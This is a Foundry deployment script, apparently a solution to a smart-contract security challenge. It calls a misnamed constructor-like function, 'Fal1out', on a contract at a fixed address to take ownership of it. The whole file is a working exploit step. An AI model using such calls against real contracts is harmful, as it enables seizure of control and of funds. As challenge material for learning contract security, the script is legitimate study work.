// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/fallout.sol";

contract FalloutScript is Script {
    Fallout public contractIntance;

    function setUp() public {
        contractIntance = Fallout(
            payable(0x8c1b726df77f00196aF075BdA6DAA2473caa04c0)
        );
    }

    function run() public {
        vm.startBroadcast();
        console2.log(msg.sender);
        contractIntance.Fal1out{value: 0.0001 ether}();
        vm.stopBroadcast();
    }
}
